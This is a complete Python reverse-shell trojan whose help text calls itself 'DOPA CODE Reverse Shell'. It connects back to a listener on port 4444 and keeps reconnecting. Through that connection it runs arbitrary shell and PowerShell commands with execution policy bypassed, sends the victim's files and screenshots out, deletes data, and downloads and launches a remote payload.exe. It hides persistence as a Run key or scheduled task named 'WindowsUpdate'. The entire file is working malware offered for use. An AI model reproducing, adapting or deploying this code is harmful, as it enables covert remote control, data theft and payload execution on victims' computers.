import socket
import os
import sys
import subprocess
import base64
import time
import shutil
import platform
import json
import hashlib

HOST = "127.0.0.1"
PORT = 4444
RECONNECT_DELAY = 5
MAX_RECONNECTS = -1
STARTUP_DELAY = 0
STOP_MARKER = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".stop")
MAX_OUTPUT = 2_000_000
CMD_TIMEOUT = 60

HELP = """=== DOPA CODE Reverse Shell ===
COMMANDS:
  shell <cmd>          Execute command via system shell
  powershell <cmd>     Execute via PowerShell
  ps <cmd>             Alias for powershell
  cd <dir> / pwd       Navigate
  ls [dir]             List directory
  cat <file>           Show file contents
  rm <path>            Delete file/dir
  mkdir <dir>          Create directory
  mv <src> <dst>       Move/rename
  pslist               List processes
  kill <pid>           Terminate process
  info / sysinfo       System information
  screenshot           Capture screen (saved on listener)
  download <path>      Exfiltrate file to listener
  upload <path>        Upload file from listener to victim
  download_exec <url>  Download & execute a payload
  persist [runkey|task] Install persistence
  sleep <secs>         Pause
  cls                  Clear screen
  exit                 Close connection (reconnects)
  die                  Permanent shutdown
  help                 This help"""

def send(sock, data):
    sock.sendall((data + "\n> ").encode("utf-8", errors="replace"))

def recv(sock):
    try:
        data = sock.recv(8192)
        if not data:
            return ""
        return data.decode("utf-8", errors="replace").strip()
    except:
        return ""

def run_system(command):
    try:
        argv = ["cmd.exe", "/c", command] if os.name == "nt" else ["sh", "-c", command]
        r = subprocess.run(argv, capture_output=True, text=True, timeout=CMD_TIMEOUT)
        out = (r.stdout or "") + (r.stderr or "")
        out = out[:MAX_OUTPUT]
        return out if out.strip() else "[OK - no output]"
    except subprocess.TimeoutExpired:
        return "[ERROR: timeout]"
    except Exception as e:
        return f"[ERROR: {e}]"

def run_powershell(command):
    try:
        r = subprocess.run(
            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command],
            capture_output=True, text=True, timeout=CMD_TIMEOUT,
        )
        out = (r.stdout or "") + (r.stderr or "")
        out = out[:MAX_OUTPUT]
        return out if out.strip() else "[OK - no output]"
    except subprocess.TimeoutExpired:
        return "[ERROR: timeout]"
    except Exception as e:
        return f"[ERROR: {e}]"

def take_screenshot():
    if os.name != "nt":
        return None
    path = os.path.join(os.environ.get("TEMP", "."), f"shot_{int(time.time())}.png")
    ps = f"""
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen($b.X, $b.Y, 0, 0, $b.Size)
$bmp.Save('{path}', [System.Drawing.Imaging.ImageFormat]::Png)
$g.Dispose(); $bmp.Dispose()
"""
    try:
        subprocess.run(
            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps],
            capture_output=True, text=True, timeout=20,
        )
        return path if os.path.exists(path) else None
    except:
        return None

def install_persistence(method="task"):
    if os.name != "nt":
        return "[ERROR] persistence requires Windows"
    try:
        exe = sys.executable.replace("python.exe", "pythonw.exe")
        if not os.path.exists(exe):
            exe = sys.executable
        script = os.path.abspath(sys.argv[0])
        if method == "runkey":
            name = "WindowsUpdate"
            ps = f"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{name}' -Value '\"{exe}\" \"{script}\"' -Force"
        else:
            name = "WindowsUpdate" + str(os.getpid())
            ps = f"$a = New-ScheduledTaskAction -Execute '{exe}' -Argument '\"{script}\"'; $t = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName '{name}' -Action $a -Trigger $t -Force | Out-Null"
        r = subprocess.run(
            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps],
            capture_output=True, text=True, timeout=30,
        )
        if r.returncode == 0:
            return f"[OK] persistence ({method}) installed as '{name}'"
        return f"[ERROR] {r.stderr[:500]}"
    except Exception as e:
        return f"[ERROR: {e}]"

def send_file(sock, path):
    with open(path, "rb") as f:
        data = f.read()
    b64 = base64.b64encode(data).decode()
    digest = hashlib.sha256(data).hexdigest()
    send(sock, f"[FILE] {os.path.basename(path)} | {len(data)} bytes | sha256:{digest}")
    send(sock, "[FILE] Receiving base64 data... send 'EOF' when done")
    for i in range(0, len(b64), 4096):
        try:
            sock.sendall((b64[i:i+4096] + "\n").encode())
            time.sleep(0.05)
        except:
            return
    sock.sendall(b"EOF\n")
    time.sleep(0.1)

def recv_file(sock, dest):
    send(sock, "[FILE] Ready. Send file data in base64, finish with 'EOF'")
    b64_data = ""
    while True:
        line = recv(sock)
        if line == "EOF":
            break
        b64_data += line
    try:
        data = base64.b64decode(b64_data)
        with open(dest, "wb") as f:
            f.write(data)
        digest = hashlib.sha256(data).hexdigest()
        return f"[OK] received {len(data)} bytes -> {dest} ({digest[:8]})"
    except Exception as e:
        return f"[ERROR] {e}"

def dispatch(sock, command):
    low = command.lower()
    if low in ("help", "?"):
        send(sock, HELP)
    elif low in ("pwd", "cwd"):
        send(sock, os.getcwd())
    elif low.startswith("cd "):
        try:
            os.chdir(command[3:].strip())
            send(sock, os.getcwd())
        except Exception as e:
            send(sock, f"[ERROR] {e}")
    elif low.startswith("ls") or low.startswith("dir"):
        target = command.split(maxsplit=1)[1].strip() if len(command.split(maxsplit=1)) > 1 else "."
        try:
            items = os.listdir(target)
            send(sock, "\n".join(items) if items else "[empty directory]")
        except Exception as e:
            send(sock, f"[ERROR] {e}")
    elif low.startswith("cat "):
        try:
            with open(command[4:].strip(), "r", errors="replace") as f:
                send(sock, f.read()[:MAX_OUTPUT])
        except Exception as e:
            send(sock, f"[ERROR] {e}")
    elif low.startswith("rm "):
        try:
            path = command[3:].strip()
            if os.path.isfile(path):
                os.remove(path)
            elif os.path.isdir(path):
                shutil.rmtree(path)
            send(sock, f"[OK] deleted: {path}")
        except Exception as e:
            send(sock, f"[ERROR] {e}")
    elif low.startswith("mkdir "):
        try:
            os.makedirs(command[6:].strip(), exist_ok=True)
            send(sock, f"[OK] created: {command[6:].strip()}")
        except Exception as e:
            send(sock, f"[ERROR] {e}")
    elif low.startswith("mv "):
        try:
            parts = command[3:].strip().split()
            if len(parts) >= 2:
                shutil.move(parts[0], parts[1])
                send(sock, f"[OK] moved {parts[0]} -> {parts[1]}")
            else:
                send(sock, "[ERROR] usage: mv <src> <dst>")
        except Exception as e:
            send(sock, f"[ERROR] {e}")
    elif low.startswith("shell "):
        send(sock, run_system(command[6:]))
    elif low.startswith("powershell ") or low.startswith("ps "):
        prefix = "powershell " if low.startswith("powershell ") else "ps "
        send(sock, run_powershell(command[len(prefix):]))
    elif low in ("pslist", "tasklist"):
        send(sock, run_system("tasklist /v"))
    elif low.startswith("kill "):
        pid = command[5:].strip()
        send(sock, run_system(f"taskkill /F /PID {pid}" if os.name == "nt" else f"kill -9 {pid}"))
    elif low in ("info", "sysinfo"):
        info = {
            "hostname": platform.node(),
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "cwd": os.getcwd(),
            "username": os.environ.get("USERNAME", os.environ.get("USER", "N/A")),
            "userdomain": os.environ.get("USERDOMAIN", "N/A"),
            "python": sys.version.split()[0],
        }
        send(sock, json.dumps(info, indent=2))
    elif low.startswith("sleep "):
        try:
            secs = int(command.split()[1])
            time.sleep(secs)
            send(sock, f"[OK] slept {secs}s")
        except:
            send(sock, "[ERROR] usage: sleep <seconds>")
    elif low == "screenshot":
        path = take_screenshot()
        if not path:
            send(sock, "[ERROR] screenshot failed")
        else:
            send_file(sock, path)
            send(sock, f"[OK] screenshot sent: {path}")
    elif low.startswith("download "):
        path = command[9:].strip()
        if not os.path.isfile(path):
            send(sock, f"[ERROR] file not found: {path}")
        else:
            send_file(sock, path)
            send(sock, f"[OK] file sent: {path}")
    elif low.startswith("upload "):
        dest = command[7:].strip()
        send(sock, recv_file(sock, dest))
    elif low == "persist":
        send(sock, install_persistence("task"))
    elif low.startswith("persist "):
        send(sock, install_persistence(command[8:].strip()))
    elif low.startswith("download_exec "):
        url = command[14:].strip()
        send(sock, run_powershell(
            f"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; "
            f"(New-Object Net.WebClient).DownloadFile('{url}', '$env:TEMP\\payload.exe'); "
            f"Start-Process '$env:TEMP\\payload.exe'"
        ))
    elif low == "cls":
        send(sock, "\n" * 50)
    else:
        send(sock, run_system(command))

def main():
    if STARTUP_DELAY > 0:
        time.sleep(STARTUP_DELAY)
    attempts = 0
    while True:
        if os.path.exists(STOP_MARKER):
            return
        if MAX_RECONNECTS >= 0 and attempts > MAX_RECONNECTS:
            return
        try:
            sock = socket.create_connection((HOST, PORT), timeout=10)
        except OSError:
            attempts += 1
            time.sleep(RECONNECT_DELAY)
            continue
        sock.settimeout(None)
        try:
            banner = f"Connected | {platform.node()} | {platform.system()} {platform.release()}"
            send(sock, banner)
            while True:
                cmd = recv(sock)
                if not cmd:
                    break
                low = cmd.lower()
                if low in ("exit", "quit"):
                    send(sock, "[OK] connection closed, will reconnect")
                    break
                if low == "die":
                    try:
                        with open(STOP_MARKER, "w") as f:
                            f.write("")
                    except:
                        pass
                    send(sock, "[OK] permanent shutdown")
                    return
                dispatch(sock, cmd)
        except (ConnectionError, OSError):
            pass
        finally:
            try:
                sock.close()
            except:
                pass
        attempts += 1
        time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    main()